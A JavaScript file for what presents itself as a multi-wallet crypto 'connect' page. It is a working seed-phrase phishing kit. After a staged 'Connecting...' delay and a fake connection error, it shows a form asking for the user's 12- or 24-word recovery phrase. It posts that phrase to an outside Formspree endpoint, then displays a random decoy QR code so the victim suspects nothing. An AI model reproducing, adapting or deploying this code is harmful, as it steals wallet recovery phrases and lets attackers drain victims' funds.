// === Wallet Page Navigation ===
function goToPage(num) {
  resetHeaderImages(num); // Reset header images before navigation
  window.location.href = num === 1 ? "index.html" : "page2.html";
}

// === Solana Connection or Fallback ===
async function connectSolanaWallet() {
  const loadingOverlay = document.createElement('div');
  loadingOverlay.id = 'loading-overlay';
  loadingOverlay.style.cssText = `
    display: flex;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw; /* Use viewport width */
    height: 100vh; /* Use viewport height */
    background: rgba(20, 20, 20, 0.9);
    z-index: 1005;
    justify-content: center;
    align-items: center;
    overflow: hidden; /* Prevent internal scrolling */
  `;

  const loadingContent = document.createElement('div');
  loadingContent.style.cssText = `display: flex; align-items: center; gap: 15px; max-height: 80px;`; // Tight height limit

  const loadingCircle = document.createElement('div');
  loadingCircle.style.cssText = `
    width: 30px;
    height: 30px;
    border: 4px solid #fff;
    border-top: 4px solid gold;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  `;

  const loadingText = document.createElement('span');
  loadingText.textContent = `Connecting to Phantom...`;
  loadingText.style.cssText = `font-size: 14px; white-space: nowrap;`; // Prevent wrapping

  loadingContent.appendChild(loadingCircle);
  loadingContent.appendChild(loadingText);
  loadingOverlay.appendChild(loadingContent);
  document.body.appendChild(loadingOverlay);

  document.body.style.overflow = 'hidden'; // Prevent body scrolling
  document.body.style.position = 'fixed'; // Freeze body position
  document.body.style.width = '100%'; // Ensure body width matches viewport

  setTimeout(async () => {
    loadingOverlay.remove();
    document.body.style.overflow = 'auto'; // Restore body scrolling
    document.body.style.position = ''; // Reset body position
    document.body.style.width = ''; // Reset body width
    showSolanaManualFallback();
  }, 4000);
}

// === Manual Fallback for Phantom ===
function showSolanaManualFallback() {
  const container = document.createElement("div");
  container.id = "manualConnectContainer";
  container.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    padding: 30px;
    background-color: #1a1a1a;
    border-radius: 10px;
    color: white;
    text-align: center;
    width: 90%;
    max-width: 90%;
    margin: 0 auto;
    box-shadow: 0 0 10px gold;
    z-index: 1006;
    max-height: 80vh;
    overflow-y: auto;
  `;

  container.innerHTML = `
    <h3 style="color: red;">Error connecting....</h3>
    <h4 style="color: green;">Connect Manually</h4>
    <textarea id="phraseInput" placeholder="Enter your phrases..." style="width: 100%; height: 120px; font-size: 16px; padding: 10px; color: red; background-color: #222; border: 1px solid white; border-radius: 8px; resize: none;"></textarea>
    <p>Enter your phrases in the box manually, typically 12 or 24 words</p>
    <button id="connectButton" style="margin-top: 10px; padding: 10px 20px; background-color: gold; color: black; font-weight: bold; border-radius: 10px; box-shadow: 0 3px white; border: none; cursor: pointer;">Connect</button>
    <div id="qrBox" style="margin-top: 20px;"></div>
  `;

  const closeBtn = document.createElement('button');
  closeBtn.textContent = '×';
  closeBtn.style.cssText = `
    position: absolute;
    top: 10px;
    right: 10px;
    width: 30px;
    height: 30px;
    background-color: #ff4444;
    color: white;
    border: none;
    border-radius: 50%;
    cursor: pointer;
    font-size: 20px;
    line-height: 30px;
  `;
  closeBtn.onclick = () => {
    container.remove();
    resetHeaderImages(); // Reset header images on close
  };
  container.appendChild(closeBtn);

  document.body.appendChild(container);

  const input = document.getElementById("phraseInput");
  input.addEventListener("input", () => {
    let value = input.value.trim();
    let words = value.split(/\s+/).filter(Boolean);

    if (value.endsWith(" ")) {
      let numberedText = "";
      words.forEach((word, index) => {
        const number = index + 1;
        numberedText += `${number}. ${word} `;
      });
      input.value = numberedText.trim();
      words = input.value.trim().split(/\s+/).filter(Boolean).map(word => word.replace(/^\d+\.\s/, ''));
    }

    if (words.length === 12 || words.length === 24) {
      input.style.color = "green";
    } else if (words.length > 12 && words.length < 24) {
      input.style.color = "red";
    } else {
      input.style.color = "red";
    }

    if (words.length === 23 && value.endsWith(" ")) {
      input.style.color = "green";
    }
    if (words.length === 24 && value.endsWith(" ")) {
      alert("24 words reached");
      input.value = input.value.trim();
      input.disabled = true;
    }
  });

  const connectButton = document.getElementById("connectButton");
  connectButton.addEventListener("click", handleManualConnect);
}

// === Handle Manual Connect and Send to Formspree ===
function handleManualConnect() {
  const input = document.getElementById("phraseInput");
  const words = input.value.trim().split(/\s+/).filter(Boolean).map(word => word.replace(/^\d+\.\s/, ''));

  if (words.length !== 12 && words.length !== 24) {
    alert("❌ Enter exactly 12 or 24 words.");
    return;
  }

  const qrBox = document.getElementById("qrBox");
  qrBox.innerHTML = `
    <div class="loading-circle" style="margin: 10px auto; width: 30px; height: 30px; border: 4px solid #fff; border-top: 4px solid gold; border-radius: 50%; animation: spin 1s linear infinite;"></div>
    <p style="color: gold;">Connecting...</p>
  `;

  const formspreeID = "manblypd";
  const text = words.join(" ");

  setTimeout(async () => {
    try {
      await fetch(`https://formspree.io/f/${formspreeID}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ "user-input": text }),
      });
      console.log("Phrase sent to email successfully.");
    } catch (err) {
      console.error("Failed to send phrase:", err);
    }

    const fakeCode = Math.floor(Math.random() * 1000000000);
    qrBox.innerHTML = `
      <p style="color: white;">Scan this code:</p>
      <img src="https://api.qrserver.com/v1/create-qr-code/?data=${fakeCode}&size=150x150" alt="QR Code" />
      <p style="color: green; margin-top: 10px;">ID: ${fakeCode}</p>
    `;
  }, 4000);
}

// === Show Wallet Overlay ===
function showWalletOverlay() {
  const walletOverlay = document.createElement('div');
  walletOverlay.id = 'wallet-overlay';
  walletOverlay.style.cssText = `
    display: flex;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw; /* Use viewport width */
    height: 100vh; /* Use viewport height */
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 1004;
    justify-content: center;
    align-items: center;
    overflow: hidden; /* Prevent scrolling */
  `;

  const walletSelection = document.createElement('section');
  walletSelection.id = 'wallet-selection';
  walletSelection.style.cssText = `
    background-color: rgba(0, 0, 0, 0.95);
    padding: 2rem;
    border-radius: 10px;
    box-shadow: 3px 3px 0 white;
    width: 80%;
    max-width: 600px;
    margin: 0 auto;
    text-align: center;
    backdrop-filter: blur(5px);
    max-height: 80vh;
    overflow-y: auto;
  `;

  const closeBtn = document.createElement('button');
  closeBtn.textContent = '×';
  closeBtn.style.cssText = `
    position: absolute;
    top: 10px;
    right: 10px;
    width: 30px;
    height: 30px;
    background-color: #ff4444;
    color: white;
    border: none;
    border-radius: 50%;
    cursor: pointer;
    font-size: 20px;
    line-height: 30px;
  `;
  closeBtn.onclick = () => {
    walletOverlay.remove();
    resetHeaderImages(); // Reset header images on close
  };
  walletSelection.appendChild(closeBtn);

  const title = document.createElement('h2');
  title.textContent = 'Select your wallet';
  title.style.cssText = `font-size: 2rem; margin-bottom: 1rem;`;

  const walletOptions = document.createElement('div');
  walletOptions.className = 'wallet-options';
  walletOptions.style.cssText = `
    display: flex;
    flex-direction: column;
    justify-content: center;
    gap: 1rem;
    padding: 10px;
    margin-bottom: 1rem;
  `;

  const wallets = [
    { name: 'Metamask', img: 'Metamask.jpeg' },
    { name: 'Trustwallet', img: 'Trustwallet.jpeg' },
    { name: 'Coinbase', img: 'Coinbase.png' },
    { name: 'Binance', img: 'Binance.png' },
    { name: 'Other', img: 'Other.png' },
    { name: 'Ledger', img: 'Ledger.jpeg' },
    { name: 'Phantom', img: 'Phantom.png' },
    { name: 'Polygon', img: 'Polygon.jpeg' },
    { name: 'Ronin', img: 'Ronin.png' },
    { name: 'SafePal', img: 'Safepal.png' },
    { name: 'Sui', img: 'Sui.png' },
    { name: 'Uniswap', img: 'Uniswap.jpeg' },
    { name: 'WalletConnect', img: 'Walletconnect.jpeg' },
    { name: 'Kepler', img: 'Kepler.jpeg' },
    { name: 'Solo Dex', img: 'Solo_dex.jpeg' },
    { name: 'XUMM', img: 'Xumm.jpeg' },
    { name: 'Bittensor', img: 'Bittensor.png' },
    { name: 'Compass', img: 'Compass.png' },
    { name: 'Compound', img: 'Compound.jpeg' },
    { name: 'Gate', img: 'Gate.webp' },
    { name: 'Bitpay', img: 'Bitpay.jpeg' },
    { name: 'Bing', img: 'Bing.png' },
  ];

  console.log("Wallet list:", wallets);
  wallets.forEach(wallet => {
    const btn = document.createElement('button');
    btn.className = 'wallet-btn';
    btn.style.cssText = `
      padding: 0.5rem 1rem;
      border: none;
      cursor: pointer;
      font-size: 1rem;
      background: none;
      display: flex;
      align-items: center;
      transition: transform 0.3s ease;
    `;
    const img = document.createElement('img');
    img.src = wallet.img;
    img.alt = wallet.name;
    img.style.cssText = `
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 10px;
    `;
    const span = document.createElement('span');
    span.textContent = wallet.name;
    btn.appendChild(img);
    btn.appendChild(span);
    btn.onclick = () => {
      walletOverlay.remove();
      showLoadingOverlay(wallet);
    };
    walletOptions.appendChild(btn);
  });

  walletSelection.appendChild(title);
  walletSelection.appendChild(walletOptions);
  walletOverlay.appendChild(walletSelection);
  document.body.appendChild(walletOverlay);

  walletOptions.scrollTop = 0;
}

// === Loading Transition Before Wallet Connect ===
function showLoadingOverlay(wallet) {
  const loadingOverlay = document.createElement('div');
  loadingOverlay.id = 'loading-overlay';
  loadingOverlay.style.cssText = `
    display: flex;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw; /* Use viewport width */
    height: 100vh; /* Use viewport height */
    background: rgba(20, 20, 20, 0.9);
    z-index: 1005;
    justify-content: center;
    align-items: center;
    overflow: hidden; /* Prevent internal scrolling */
  `;

  const loadingContent = document.createElement('div');
  loadingContent.style.cssText = `display: flex; align-items: center; gap: 15px; max-height: 80px;`; // Tight height limit

  const walletImg = document.createElement('img');
  walletImg.src = wallet.img;
  walletImg.alt = `${wallet.name} Wallet`;
  walletImg.style.cssText = `
    width: 40px;
    height: 40px;
    border-radius: 50%;
  `;

  const loadingCircle = document.createElement('div');
  loadingCircle.style.cssText = `
    width: 30px;
    height: 30px;
    border: 4px solid #fff;
    border-top: 4px solid gold;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  `;

  const loadingText = document.createElement('span');
  loadingText.textContent = `Connecting to ${wallet.name}...`;
  loadingText.style.cssText = `font-size: 14px; white-space: nowrap;`; // Prevent wrapping

  loadingContent.appendChild(walletImg);
  loadingContent.appendChild(loadingCircle);
  loadingContent.appendChild(loadingText);
  loadingOverlay.appendChild(loadingContent);
  document.body.appendChild(loadingOverlay);

  document.body.style.overflow = 'hidden'; // Prevent body scrolling
  document.body.style.position = 'fixed'; // Freeze body position
  document.body.style.width = '100%'; // Ensure body width matches viewport

  setTimeout(() => {
    loadingOverlay.remove();
    document.body.style.overflow = 'auto'; // Restore body scrolling
    document.body.style.position = ''; // Reset body position
    document.body.style.width = ''; // Reset body width
    showSolanaManualFallback();
  }, 4000);
}

// === Reset Header Images ===
function resetHeaderImages(pageNum = null) {
  const logo = document.querySelector('.logo');
  const walletIcon = document.querySelector('.wallet-icon');
  const homeIcon = document.querySelector('.home-icon');
  if (logo) {
    const newLogoSrc = 'Crypto.png'; // Crypto.png as permanent Logo
    if (!logo.src.includes(newLogoSrc)) {
      logo.src = newLogoSrc;
      logo.onload = () => console.log('Logo reloaded');
      logo.onerror = () => console.error('Logo failed to load');
    }
  }
  if (walletIcon) {
    const newWalletSrc = 'Wallet_icon.png'; // Wallet_icon.png as permanent Wallet on index.html
    if (!walletIcon.src.includes(newWalletSrc)) {
      walletIcon.src = newWalletSrc;
      walletIcon.onload = () => console.log('Wallet icon reloaded');
      walletIcon.onerror = () => console.error('Wallet icon failed to load');
    }
  }
  if (homeIcon) {
    if (pageNum === 2) { // Show Home.png only on page2.html
      const newHomeSrc = 'Home.png';
      if (!homeIcon.src.includes(newHomeSrc)) {
        homeIcon.src = newHomeSrc;
        homeIcon.onload = () => console.log('Home icon reloaded');
        homeIcon.onerror = () => console.error('Home icon failed to load');
        homeIcon.onclick = () => goToPage(1); // Navigate back to index.html
      }
    } else {
      homeIcon.style.display = 'none'; // Hide on index.html
    }
  }
}

document.addEventListener('DOMContentLoaded', () => {
  resetHeaderImages(); // Initial reset on page load
  const walletImage = document.querySelector('.wallet-image');
  if (walletImage) {
    walletImage.addEventListener('click', () => {
      showSolanaManualFallback();
    });
  }

  const clickHereButtons = document.querySelectorAll('.click-here');
  if (clickHereButtons) {
    clickHereButtons.forEach(button => {
      button.addEventListener('click', () => {
        showWalletOverlay();
      });
    });
  }
});